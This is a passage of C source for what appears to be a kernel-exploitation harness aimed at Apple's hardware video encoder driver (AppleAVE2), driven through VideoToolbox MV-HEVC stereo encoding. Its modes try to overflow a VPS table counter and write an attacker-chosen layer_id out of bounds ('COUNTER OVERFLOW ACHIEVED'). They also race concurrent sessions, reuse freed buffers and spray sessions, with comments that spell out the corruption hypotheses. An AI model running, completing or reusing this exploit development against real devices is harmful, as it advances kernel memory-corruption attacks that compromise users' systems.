                                    rlog("After flush: done=%d, status=%d, pset=%zu\n",
                                         g_encode_done, (int)g_cb_status, g_last_pset_count);
                                }
                                if (g_encode_done && g_cb_status == 0)
                                    rlog("\n*** SUCCESS B: MV-HEVC without HasStereo props! ***\n");
                            }
                            CFRelease(tbg);
                        }
                        CFRelease(ltc); CFRelease(rtc);
                    }
                    if (left) CVPixelBufferRelease(left);
                    if (right) CVPixelBufferRelease(right);
                }
                VTCompressionSessionInvalidate(s); CFRelease(s);
            }
        }

        /* Test C: Larger resolution (1920x1080) - maybe 128x128 is too small */
        rlog("\n--- Test C: 1920x1080 YUV420 ---\n");
        {
            CFMutableDictionaryRef es = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            VTCompressionSessionRef s = NULL;
            OSStatus r = VTCompressionSessionCreate(NULL, 1920, 1080,
                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
            CFRelease(es);
            rlog("Create 1920x1080: %d\n", (int)r);
            if (r == 0 && s) {
                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
                int kf = 1;
                CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
                CFRelease(kfn);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

                int v0 = 0, v1 = 1;
                CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &v0);
                CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &v1);
                CFArrayRef ids = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
                VTSessionSetProperty(s, CFSTR("MVHEVCVideoLayerIDs"), ids);
                VTSessionSetProperty(s, CFSTR("MVHEVCViewIDs"), ids);
                CFRelease(ids); CFRelease(n0); CFRelease(n1);

                OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
                rlog("Prepare: %d\n", (int)pr);
                if (pr == 0) {
                    CVPixelBufferRef left = create_yuv_pb(1920, 1080, 0x40);
                    CVPixelBufferRef right = create_yuv_pb(1920, 1080, 0x80);
                    if (left && right) {
                        CMTag tl0 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 0);
                        CMTag left_tags[2] = { kCMTagStereoLeftEye, tl0 };
                        CMTagCollectionRef ltc = NULL;
                        CMTagCollectionCreate(NULL, left_tags, 2, &ltc);
                        CMTag tl1 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 1);
                        CMTag right_tags[2] = { kCMTagStereoRightEye, tl1 };
                        CMTagCollectionRef rtc = NULL;
                        CMTagCollectionCreate(NULL, right_tags, 2, &rtc);
                        CMTagCollectionRef tcs[2] = { ltc, rtc };
                        CVPixelBufferRef pbs[2] = { left, right };
                        CFArrayRef tc_arr = CFArrayCreate(NULL, (const void **)tcs, 2, &kCFTypeArrayCallBacks);
                        CFArrayRef pb_arr = CFArrayCreate(NULL, (const void **)pbs, 2, &kCFTypeArrayCallBacks);
                        CMTaggedBufferGroupRef tbg = NULL;
                        CMTaggedBufferGroupCreate(NULL, tc_arr, pb_arr, &tbg);
                        CFRelease(tc_arr); CFRelease(pb_arr);
                        if (tbg) {
                            g_encode_done = 0; g_cb_status = -999; g_cb_count = 0;
                            VTEncodeInfoFlags fi = 0;
                            CMTime pts = CMTimeMake(0, 30);
                            CMTime dur = CMTimeMake(1, 30);
                            OSStatus enc = VTCompressionSessionEncodeMultiImageFrame(
                                s, tbg, pts, dur, NULL, NULL, &fi);
                            rlog("EncodeMultiImage: %d\n", (int)enc);
                            if (enc == 0) {
                                for (int i = 0; i < 500 && !g_encode_done; i++) usleep(10000);
                                rlog("Poll: done=%d, status=%d, cb=%d, pset=%zu, bytes=%zu\n",
                                     g_encode_done, (int)g_cb_status, g_cb_count,
                                     g_last_pset_count, g_last_pset_total_bytes);
                                if (!g_encode_done) {
                                    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                                    for (int i = 0; i < 200 && !g_encode_done; i++) usleep(10000);
                                    rlog("After flush: done=%d, status=%d, pset=%zu\n",
                                         g_encode_done, (int)g_cb_status, g_last_pset_count);
                                }
                                if (g_encode_done && g_cb_status == 0)
                                    rlog("\n*** SUCCESS C: MV-HEVC at 1920x1080! ***\n");
                            }
                            CFRelease(tbg);
                        }
                        CFRelease(ltc); CFRelease(rtc);
                    }
                    if (left) CVPixelBufferRelease(left);
                    if (right) CVPixelBufferRelease(right);
                }
                VTCompressionSessionInvalidate(s); CFRelease(s);
            }
        }

    } else if (strcmp(mode, "stereo_overflow") == 0) {
        int num_enc = 100;
        int lid = 1;
        if (argc > 2) num_enc = atoi(argv[2]);
        if (argc > 3) lid = (int)strtol(argv[3], NULL, 0);
        if (num_enc < 1) num_enc = 100;
        if (lid < 1) lid = 1;
        rlog("STEREO_OVERFLOW: %d MV-HEVC stereo encodes, layer_id=%d (0x%X)\n", num_enc, lid, lid);
        rlog("With pset=4 per encode, overflow at entry 256 = ~64 encodes\n");
        rlog("At entry 256, writes cross VPS table sub-object boundary\n");
        rlog("layer_id written to bytes 4-7 of each 16-byte entry\n\n");

        if (!VTCompressionSessionEncodeMultiImageFrame) {
            rlog("FAILED: EncodeMultiImageFrame not available\n"); goto done;
        }

        VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, lid);
        if (!s) { rlog("FAILED: create_mvhevc_encoder\n"); goto done; }

        g_cb_count = 0;
        int errors = 0;
        for (int i = 0; i < num_enc; i++) {
            int st = encode_one_stereo_lid(s, i, 1920, 1080, lid);
            if (st != 0) {
                rlog("[%d] ERROR: %d\n", i, st);
                errors++;
                if (errors > 3) { rlog("Too many errors, stopping\n"); break; }
            } else {
                int total_entries = g_cb_count * (int)g_last_pset_count;
                if (i < 5 || i % 10 == 0 || i >= 60 || total_entries >= 240) {
                    rlog("[%d] ok, pset=%zu, bytes=%zu, cb=%d, est_entries=%d%s\n",
                         i, g_last_pset_count, g_last_pset_total_bytes, g_cb_count,
                         total_entries,
                         total_entries >= 256 ? " *** OOB ***" : "");
                }
            }
        }
        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
        int final_entries = g_cb_count * (int)g_last_pset_count;
        rlog("\nDone: %d encodes, %d errors, cb=%d, est_entries=%d\n",
             num_enc, errors, g_cb_count, final_entries);
        if (final_entries >= 256) {
            rlog("*** COUNTER OVERFLOW ACHIEVED: %d entries > 256 ***\n", final_entries);
            rlog("VPS table sub-object boundary crossed!\n");
        } else {
            rlog("Counter did NOT overflow (need 256+ entries, got %d)\n", final_entries);
        }
        VTCompressionSessionInvalidate(s); CFRelease(s);

    } else if (strcmp(mode, "diag5") == 0) {
        rlog("DIAG5: MV-HEVC with ALL required stereo properties\n");
        rlog("Uses official SDK constants + MVHEVCLeftAndRightViewIDs + HeroEye\n\n");

        extern OSStatus VTCompressionSessionEncodeMultiImageFrame(
            VTCompressionSessionRef session,
            CMTaggedBufferGroupRef taggedBufferGroup,
            CMTime presentationTimeStamp,
            CMTime duration,
            CFDictionaryRef frameProperties,
            void *sourceFrameRefCon,
            VTEncodeInfoFlags *infoFlagsOut)
            __attribute__((weak_import));
        if (!VTCompressionSessionEncodeMultiImageFrame) {
            rlog("EncodeMultiImageFrame not available\n"); goto done;
        }

        CFMutableDictionaryRef es = CFDictionaryCreateMutable(
            NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        VTCompressionSessionRef s = NULL;
        OSStatus r = VTCompressionSessionCreate(NULL, 1920, 1080,
            kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
        CFRelease(es);
        rlog("Create 1920x1080: %d\n", (int)r);
        if (r != 0 || !s) { rlog("FAILED\n"); goto done; }

        VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
        int kf = 1;
        CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
        VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
        CFRelease(kfn);
        VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

        /* Use official SDK constant symbols for all MV-HEVC properties */
        int v0 = 0, v1 = 1;
        CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &v0);
        CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &v1);

        /* MVHEVCVideoLayerIDs = [0, 1] */
        CFArrayRef layer_ids = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
        OSStatus sp1 = VTSessionSetProperty(s, kVTCompressionPropertyKey_MVHEVCVideoLayerIDs, layer_ids);
        rlog("MVHEVCVideoLayerIDs [0,1]: %d\n", (int)sp1);
        CFRelease(layer_ids);

        /* MVHEVCViewIDs = [0, 1] */
        CFArrayRef view_ids = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
        OSStatus sp2 = VTSessionSetProperty(s, kVTCompressionPropertyKey_MVHEVCViewIDs, view_ids);
        rlog("MVHEVCViewIDs [0,1]: %d\n", (int)sp2);
        CFRelease(view_ids);

        /* MVHEVCLeftAndRightViewIDs = [0, 1] (left=0, right=1) */
        CFArrayRef lr_ids = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
        OSStatus sp3 = VTSessionSetProperty(s, kVTCompressionPropertyKey_MVHEVCLeftAndRightViewIDs, lr_ids);
        rlog("MVHEVCLeftAndRightViewIDs [0,1]: %d\n", (int)sp3);
        CFRelease(lr_ids);

        /* HeroEye = left */
        OSStatus sp4 = VTSessionSetProperty(s, kVTCompressionPropertyKey_HeroEye, CFSTR("left"));
        rlog("HeroEye 'left': %d\n", (int)sp4);

        /* HasLeftStereoEyeView = true, HasRightStereoEyeView = true */
        OSStatus sp5 = VTSessionSetProperty(s, kVTCompressionPropertyKey_HasLeftStereoEyeView, kCFBooleanTrue);
        OSStatus sp6 = VTSessionSetProperty(s, kVTCompressionPropertyKey_HasRightStereoEyeView, kCFBooleanTrue);
        rlog("HasLeft: %d, HasRight: %d\n", (int)sp5, (int)sp6);

        /* StereoCameraBaseline (in micrometers, typical iPhone ~64mm = 64000) */
        uint32_t baseline = 64000;
        CFNumberRef bl = CFNumberCreate(NULL, kCFNumberSInt32Type, &baseline);
        OSStatus sp7 = VTSessionSetProperty(s, kVTCompressionPropertyKey_StereoCameraBaseline, bl);
        rlog("StereoCameraBaseline 64000: %d\n", (int)sp7);
        CFRelease(bl);

        /* ProfileLevel = Main10 Auto (stereo needs 10-bit) */
        OSStatus sp8 = VTSessionSetProperty(s, kVTCompressionPropertyKey_ProfileLevel,
            kVTProfileLevel_HEVC_Main10_AutoLevel);
        rlog("ProfileLevel Main10_Auto: %d\n", (int)sp8);

        CFRelease(n0); CFRelease(n1);

        OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
        rlog("Prepare: %d\n", (int)pr);

        if (pr == 0) {
            /* Create YUV420 pixel buffers */
            CVPixelBufferRef pb_left = NULL, pb_right = NULL;
            {
                CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
                    NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
                CVPixelBufferCreate(NULL, 1920, 1080,
                    kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, attrs, &pb_left);
                CVPixelBufferCreate(NULL, 1920, 1080,
                    kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, attrs, &pb_right);
                CFRelease(iosurf); CFRelease(attrs);
            }
            rlog("Left PB: %p, Right PB: %p\n", (void*)pb_left, (void*)pb_right);

            if (pb_left && pb_right) {
                /* Fill left Y plane with 0x40, right with 0x80 */
                CVPixelBufferLockBaseAddress(pb_left, 0);
                void *ly = CVPixelBufferGetBaseAddressOfPlane(pb_left, 0);
                void *luv = CVPixelBufferGetBaseAddressOfPlane(pb_left, 1);
                if (ly) memset(ly, 0x40, CVPixelBufferGetBytesPerRowOfPlane(pb_left, 0) * 1080);
                if (luv) memset(luv, 128, CVPixelBufferGetBytesPerRowOfPlane(pb_left, 1) * 540);
                CVPixelBufferUnlockBaseAddress(pb_left, 0);

                CVPixelBufferLockBaseAddress(pb_right, 0);
                void *ry = CVPixelBufferGetBaseAddressOfPlane(pb_right, 0);
                void *ruv = CVPixelBufferGetBaseAddressOfPlane(pb_right, 1);
                if (ry) memset(ry, 0x80, CVPixelBufferGetBytesPerRowOfPlane(pb_right, 0) * 1080);
                if (ruv) memset(ruv, 128, CVPixelBufferGetBytesPerRowOfPlane(pb_right, 1) * 540);
                CVPixelBufferUnlockBaseAddress(pb_right, 0);

                /* Build CMTaggedBufferGroup */
                CMTag tl0 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 0);
                CMTag left_tags[2] = { kCMTagStereoLeftEye, tl0 };
                CMTagCollectionRef ltc = NULL;
                CMTagCollectionCreate(NULL, left_tags, 2, &ltc);

                CMTag tl1 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 1);
                CMTag right_tags[2] = { kCMTagStereoRightEye, tl1 };
                CMTagCollectionRef rtc = NULL;
                CMTagCollectionCreate(NULL, right_tags, 2, &rtc);

                CMTagCollectionRef tcs[2] = { ltc, rtc };
                CVPixelBufferRef pbs[2] = { pb_left, pb_right };
                CFArrayRef tc_arr = CFArrayCreate(NULL, (const void **)tcs, 2, &kCFTypeArrayCallBacks);
                CFArrayRef pb_arr = CFArrayCreate(NULL, (const void **)pbs, 2, &kCFTypeArrayCallBacks);
                CMTaggedBufferGroupRef tbg = NULL;
                OSStatus tbg_st = CMTaggedBufferGroupCreate(NULL, tc_arr, pb_arr, &tbg);
                rlog("TBG create: %d\n", (int)tbg_st);
                CFRelease(tc_arr); CFRelease(pb_arr);

                if (tbg_st == 0 && tbg) {
                    g_encode_done = 0; g_cb_status = -999; g_cb_count = 0;
                    VTEncodeInfoFlags fi = 0;
                    CMTime pts = CMTimeMake(0, 30);
                    CMTime dur = CMTimeMake(1, 30);
                    OSStatus enc = VTCompressionSessionEncodeMultiImageFrame(
                        s, tbg, pts, dur, NULL, NULL, &fi);
                    rlog("EncodeMultiImage: %d, flags=%u\n", (int)enc, (unsigned)fi);

                    if (enc == 0) {
                        for (int i = 0; i < 500 && !g_encode_done; i++) usleep(10000);
                        rlog("Poll: done=%d, status=%d, cb=%d, pset=%zu, bytes=%zu\n",
                             g_encode_done, (int)g_cb_status, g_cb_count,
                             g_last_pset_count, g_last_pset_total_bytes);
                        if (!g_encode_done) {
                            VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                            for (int i = 0; i < 200 && !g_encode_done; i++) usleep(10000);
                            rlog("After flush: done=%d, status=%d, pset=%zu\n",
                                 g_encode_done, (int)g_cb_status, g_last_pset_count);
                        }
                        if (g_encode_done && g_cb_status == 0) {
                            rlog("\n*** MV-HEVC ENCODE SUCCESS! pset=%zu bytes=%zu ***\n",
                                 g_last_pset_count, g_last_pset_total_bytes);
                        } else {
                            rlog("\nEncode failed: status=%d\n", (int)g_cb_status);
                            rlog("Trying second frame in case first always fails...\n");
                            g_encode_done = 0; g_cb_status = -999;
                            CMTime pts2 = CMTimeMake(1, 30);
                            enc = VTCompressionSessionEncodeMultiImageFrame(
                                s, tbg, pts2, dur, NULL, NULL, &fi);
                            rlog("Second EncodeMultiImage: %d\n", (int)enc);
                            if (enc == 0) {
                                for (int i = 0; i < 500 && !g_encode_done; i++) usleep(10000);
                                rlog("Poll2: done=%d, status=%d, cb=%d, pset=%zu\n",
                                     g_encode_done, (int)g_cb_status, g_cb_count, g_last_pset_count);
                            }
                        }
                    }
                    CFRelease(tbg);
                }
                CFRelease(ltc); CFRelease(rtc);
            }
            if (pb_left) CVPixelBufferRelease(pb_left);
            if (pb_right) CVPixelBufferRelease(pb_right);
        }
        VTCompressionSessionInvalidate(s); CFRelease(s);

    } else if (strcmp(mode, "concurrent_race") == 0) {
        rlog("CONCURRENT_RACE: Race multiple MV-HEVC encoder sessions\n");
        rlog("Theory: If concurrent sessions share AVE hardware state,\n");
        rlog("VPS table entries from one session might persist into another's\n");
        rlog("encode pass before the counter is reset. Apple Forums FB23045975\n");
        rlog("confirms concurrent 4K60 HEVC sessions cause dart-ave1 panics.\n\n");

        int num_threads = (argc > 2) ? atoi(argv[2]) : 2;
        int enc_per_thread = (argc > 3) ? atoi(argv[3]) : 100;
        if (num_threads < 2) num_threads = 2;
        if (num_threads > 8) num_threads = 8;

        if (phase1_verify() != 0) goto done;

        rlog("Threads: %d, encodes/thread: %d\n\n", num_threads, enc_per_thread);

        race_ctx_t ctxs[8] = {0};
        g_race_go = 0;
        pthread_t threads[8];
        for (int i = 0; i < num_threads; i++) {
            ctxs[i].thread_id = i;
            ctxs[i].encodes = enc_per_thread;
        }

        rlog("Creating %d encoder sessions + threads...\n", num_threads);
        for (int i = 0; i < num_threads; i++) {
            pthread_create(&threads[i], NULL, race_thread_fn, &ctxs[i]);
        }

        rlog("Waiting for all threads to create sessions...\n");
        for (int i = 0; i < num_threads; i++) {
            int wait = 0;
            while (!ctxs[i].started && ctxs[i].errors != -1 && wait < 100) {
                usleep(100000);
                wait++;
            }
        }

        rlog("GO! All threads encoding simultaneously.\n\n");
        g_race_go = 1;

        for (int i = 0; i < num_threads; i++) {
            pthread_join(threads[i], NULL);
        }

        rlog("\n=== CONCURRENT RACE RESULTS ===\n");
        int any_anomaly = 0;
        for (int i = 0; i < num_threads; i++) {
            rlog("Thread %d: errors=%d, max_pset=%d, max_bytes=%zu\n",
                 i, ctxs[i].errors, ctxs[i].max_pset_count,
                 ctxs[i].max_pset_bytes);
            if (ctxs[i].max_pset_count > 4) {
                rlog("  *** ANOMALY: pset_count > 4 — possible counter leak! ***\n");
                any_anomaly = 1;
            }
            if (ctxs[i].max_pset_bytes > 140) {
                rlog("  *** ANOMALY: bytes > 140 — possible cross-session state! ***\n");
                any_anomaly = 1;
            }
        }
        if (any_anomaly) {
            rlog("\n*** RACE CONDITION DETECTED: Cross-session VPS state leaked ***\n");
            rlog("This suggests the AVE hardware shares VPS table state between\n");
            rlog("concurrent encoder sessions. Counter accumulation may be possible.\n");
        } else {
            rlog("\nNo anomalies detected. Sessions appear isolated.\n");
            rlog("Try: more threads (3-4), higher resolution, or rapid create/destroy.\n");
        }

    } else if (strcmp(mode, "rapid_reuse") == 0) {
        rlog("RAPID_REUSE: Rapidly create/encode/destroy sessions to race init\n");
        rlog("Theory: Between kfree_data and constructor bzero, the counter\n");
        rlog("field holds stale data. If we allocate fast enough, a new session\n");
        rlog("might start encoding before the bzero completes on its buffer.\n\n");

        int rounds = (argc > 2) ? atoi(argv[2]) : 500;
        if (phase1_verify() != 0) goto done;

        rlog("Rounds: %d (create→encode→destroy per round)\n\n", rounds);

        int anomalies = 0;
        size_t baseline_bytes = 0;
        int baseline_set = 0;

        for (int i = 0; i < rounds; i++) {
            VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
            if (!s) {
                if (i < 5 || i % 100 == 0) rlog("[%d] create FAILED\n", i);
                continue;
            }
            int st = encode_one_stereo_kf(s, 0, 1920, 1080, 1, 1);
            if (st == 0) {
                if (!baseline_set) {
                    baseline_bytes = g_last_pset_total_bytes;
                    baseline_set = 1;
                    rlog("Baseline: pset=%zu, bytes=%zu\n", g_last_pset_count, baseline_bytes);
                }
                if (g_last_pset_total_bytes != baseline_bytes) {
                    anomalies++;
                    rlog("[%d] *** BYTES CHANGED: %zu (baseline %zu) pset=%zu ***\n",
                         i, g_last_pset_total_bytes, baseline_bytes, g_last_pset_count);
                }
                if ((int)g_last_pset_count > 4) {
                    anomalies++;
                    rlog("[%d] *** PSET COUNT ANOMALY: %zu (expected 4) ***\n",
                         i, g_last_pset_count);
                }
            }
            VTCompressionSessionInvalidate(s);
            CFRelease(s);

            if ((i+1) % 100 == 0)
                rlog("[%d/%d] anomalies=%d\n", i+1, rounds, anomalies);
        }

        rlog("\nDone: %d rounds, %d anomalies\n", rounds, anomalies);
        if (anomalies > 0)
            rlog("*** STALE STATE DETECTED — counter or pset data leaked between sessions ***\n");
        else
            rlog("No stale state detected. Buffer appears fully reinitialized each time.\n");

    } else if (strcmp(mode, "multi_session_spray") == 0) {
        rlog("MULTI_SESSION_SPRAY: Create many encoder sessions simultaneously\n");
        rlog("Theory: If mediaserverd shares a kernel AVE buffer pool, multiple\n");
        rlog("sessions might share the same underlying HEVC buffer. VPS entries\n");
        rlog("from session A's encode would persist when session B encodes.\n\n");

        int num_sessions = (argc > 2) ? atoi(argv[2]) : 16;
        int enc_per = (argc > 3) ? atoi(argv[3]) : 5;
        if (num_sessions > 64) num_sessions = 64;

        if (phase1_verify() != 0) goto done;

        rlog("Sessions: %d, encodes/session: %d\n\n", num_sessions, enc_per);

        VTCompressionSessionRef sessions[64] = {0};
        int created = 0;
        for (int i = 0; i < num_sessions; i++) {
            sessions[i] = create_mvhevc_encoder(1920, 1080, 1);
            if (sessions[i]) {
                created++;
            } else {
                rlog("[%d] create FAILED (total created: %d)\n", i, created);
                break;
            }
        }
        rlog("Created %d/%d sessions\n\n", created, num_sessions);

        int any_anomaly = 0;
        size_t baseline_bytes = 0;
        for (int round = 0; round < enc_per; round++) {
            rlog("--- Round %d ---\n", round);
            for (int i = 0; i < created; i++) {
                int st = encode_one_stereo_kf(sessions[i], round, 1920, 1080, 1, 1);
                if (round == 0 && i == 0) {
                    baseline_bytes = g_last_pset_total_bytes;
                    rlog("[S%d] baseline: pset=%zu, bytes=%zu\n",
                         i, g_last_pset_count, baseline_bytes);
                }
                if (st != 0) {
                    rlog("[S%d] encode error: %d\n", i, st);
                } else if (g_last_pset_total_bytes != baseline_bytes) {
                    any_anomaly = 1;
                    rlog("[S%d] *** BYTES ANOMALY: %zu (baseline %zu) ***\n",
                         i, g_last_pset_total_bytes, baseline_bytes);
                } else if ((int)g_last_pset_count > 4) {
                    any_anomaly = 1;
                    rlog("[S%d] *** PSET COUNT ANOMALY: %zu ***\n",
                         i, g_last_pset_count);
                }
            }
            rlog("Round %d: %d sessions encoded, anomalies=%d\n\n",
                 round, created, any_anomaly);
        }

        for (int i = 0; i < created; i++) {
            VTCompressionSessionInvalidate(sessions[i]);
            CFRelease(sessions[i]);
        }

        if (any_anomaly)
            rlog("*** CROSS-SESSION STATE DETECTED ***\n");
        else
            rlog("No cross-session state detected. Sessions appear fully isolated.\n");

    } else if (strcmp(mode, "prepare_spam") == 0) {
        /*
         * HYPOTHESIS: PrepareToEncodeFrames calls a SEPARATE external method
         * (selector ~7) on AppleAVE2 than EncodeFrame (selector ~6).
         * If PrepareToEncodeFrames touches VPS tables without the counter
         * reset that EncodeFrame performs, repeated calls may accumulate
         * the counter past the bounds check.
         *
         * Test: Create session, call PrepareToEncodeFrames N times without
         * encoding, then encode once and check pset output for anomalies.
         */
        int prepare_count = (argc > 2) ? atoi(argv[2]) : 50;
        if (prepare_count < 1) prepare_count = 50;
        if (prepare_count > 500) prepare_count = 500;

        rlog("=== PREPARE_SPAM: %d PrepareToEncodeFrames calls ===\n", prepare_count);
        rlog("Hypothesis: PrepareToEncodeFrames may increment VPS counter\n");
        rlog("without the reset that EncodeFrame triggers.\n\n");

        /* Create encoder WITHOUT calling PrepareToEncodeFrames
         * (we'll call it manually in the loop) */
        int w = 1920, h = 1080;
        VTCompressionSessionRef s = NULL;
        CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(enc_spec, kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
            kCFBooleanTrue);

        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
        OSStatus st = VTCompressionSessionCreate(NULL, w, h,
            kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
        CFRelease(enc_spec);
        CFRelease(wn); CFRelease(hn);

        if (st != noErr || !s) {
            rlog("FAILED to create encoder: %d\n", (int)st);
            goto done;
        }

        /* Set MV-HEVC properties */
        CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &(int){0});
        CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &(int){1});
        CFTypeRef layerIDs[] = { n0, n1 };
        CFArrayRef layerArr = CFArrayCreate(NULL, layerIDs, 2, &kCFTypeArrayCallBacks);
        VTSessionSetProperty(s, kVTCompressionPropertyKey_MVHEVCVideoLayerIDs, layerArr);
        VTSessionSetProperty(s, kVTCompressionPropertyKey_MVHEVCViewIDs, layerArr);
        VTSessionSetProperty(s, kVTCompressionPropertyKey_MVHEVCLeftAndRightViewIDs, layerArr);
        CFRelease(layerArr);
        VTSessionSetProperty(s, kVTCompressionPropertyKey_HeroEye, CFSTR("left"));
        VTSessionSetProperty(s, kVTCompressionPropertyKey_HasLeftStereoEyeView, kCFBooleanTrue);
        VTSessionSetProperty(s, kVTCompressionPropertyKey_HasRightStereoEyeView, kCFBooleanTrue);
        uint32_t baseline = 64000;
        CFNumberRef bl = CFNumberCreate(NULL, kCFNumberSInt32Type, &baseline);
        VTSessionSetProperty(s, kVTCompressionPropertyKey_StereoCameraBaseline, bl);
        CFRelease(bl);
        VTSessionSetProperty(s, kVTCompressionPropertyKey_ProfileLevel,
            kVTProfileLevel_HEVC_Main10_AutoLevel);
        CFRelease(n0); CFRelease(n1);

        /* Phase 1: Spam PrepareToEncodeFrames */
        rlog("Phase 1: Calling PrepareToEncodeFrames %d times...\n", prepare_count);
        int prepare_ok = 0, prepare_fail = 0;
        for (int i = 0; i < prepare_count; i++) {
            OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
            if (pr == noErr) {
                prepare_ok++;
            } else {
                prepare_fail++;
                rlog("  Prepare[%d] FAILED: %d\n", i, (int)pr);
                if (prepare_fail >= 5) {
                    rlog("  Too many failures, stopping prepare loop\n");
                    break;
                }
            }
        }
        rlog("PrepareToEncodeFrames: %d ok, %d fail\n\n", prepare_ok, prepare_fail);

        /* Phase 2: Now encode ONE frame and check pset output */
        rlog("Phase 2: Encoding single frame after prepare spam...\n");
        int enc_st = encode_one_stereo_kf(s, 0, w, h, 1, 1);
        rlog("Encode result: %d\n", enc_st);
        rlog("Pset count: %zu, bytes: %zu\n", g_last_pset_count, g_last_pset_total_bytes);

        if ((int)g_last_pset_count > 4) {
            rlog("*** ANOMALY: pset_count > 4 after prepare spam! ***\n");
            rlog("*** PrepareToEncodeFrames MAY increment VPS counter! ***\n");
        }

        /* Phase 3: Encode more frames to get baseline comparison */
        rlog("\nPhase 3: Encoding 5 more frames for baseline comparison...\n");
        for (int i = 1; i <= 5; i++) {
            enc_st = encode_one_stereo_kf(s, i, w, h, 1, 1);
            rlog("  Frame %d: pset_count=%zu bytes=%zu\n",
                 i, g_last_pset_count, g_last_pset_total_bytes);
        }

        /* Phase 4: Create fresh session, encode without prepare spam,
         * compare output */
        rlog("\nPhase 4: Control — fresh session, no prepare spam...\n");
        VTCompressionSessionInvalidate(s);
        CFRelease(s);
        s = create_mvhevc_encoder(w, h, 1);
        if (s) {
            enc_st = encode_one_stereo_kf(s, 0, w, h, 1, 1);
            rlog("Control pset count: %zu, bytes: %zu\n",
                 g_last_pset_count, g_last_pset_total_bytes);
            VTCompressionSessionInvalidate(s);
            CFRelease(s);
        }

        rlog("\n=== PREPARE_SPAM complete ===\n");

    } else if (strcmp(mode, "property_cycle") == 0) {
        /*
         * HYPOTHESIS: Changing session properties between encodes may trigger
         * SetSessionSettings (selector 6) on the kernel side, which could
         * modify VPS tables independently of the encode path.
         *
         * Test: Alternate between different MV-HEVC configurations between
         * encode calls to see if the VPS output changes unexpectedly.
         */
        int cycles = (argc > 2) ? atoi(argv[2]) : 20;
        if (cycles < 1) cycles = 20;
        if (cycles > 100) cycles = 100;

        rlog("=== PROPERTY_CYCLE: %d cycles of property changes ===\n", cycles);
        rlog("Hypothesis: SetSessionSettings may modify VPS tables\n");
        rlog("independently of EncodeFrame path.\n\n");

        int w = 1920, h = 1080;

        /* Track pset outputs across cycles */
        size_t last_count = 0, last_bytes = 0;
        int anomalies = 0;

        for (int c = 0; c < cycles; c++) {
            VTCompressionSessionRef s = create_mvhevc_encoder(w, h, 1);
            if (!s) {
                rlog("Cycle %d: failed to create encoder\n", c);
                continue;
            }

            /* Encode baseline frame */
            encode_one_stereo_kf(s, 0, w, h, 1, 1);
            size_t base_count = g_last_pset_count;
            size_t base_bytes = g_last_pset_total_bytes;

            /* Change properties between encodes */
            for (int p = 0; p < 5; p++) {
                /* Toggle stereo baseline to trigger SetSessionSettings */
                uint32_t new_baseline = 64000 + (p * 1000);
